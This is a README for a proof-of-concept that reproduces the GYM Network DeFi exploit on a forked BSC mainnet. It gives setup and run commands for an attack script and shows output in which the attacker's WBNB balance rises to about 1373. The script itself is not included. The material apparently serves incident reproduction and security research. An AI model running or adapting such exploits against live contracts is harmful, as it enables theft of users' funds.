# GYM Network re-hack PoC

## How to run

Install nodejs/npm first

Set up the `forking url` (in `hardhat.config.ts`)

e.g. https://speedy-nodes-nyc.moralis.io/xxxxxxxxxxx/bsc/mainnet/archive (
You need to apply for speedy-nodes from moralis.io)

Then run
```bash
npm install
npx hardhat run scripts/attack.ts
```
You will see similar output later
```
WBNB balance of attacker: 0.001
Exploiting...
Exploit complete.
WBNB balance of attacker: 1373.565008267780664495
```
This means the attack is complete
> The block height of the fork is 16798806


## Link
* https://twitter.com/BlockSecTeam/status/1512832398643265537
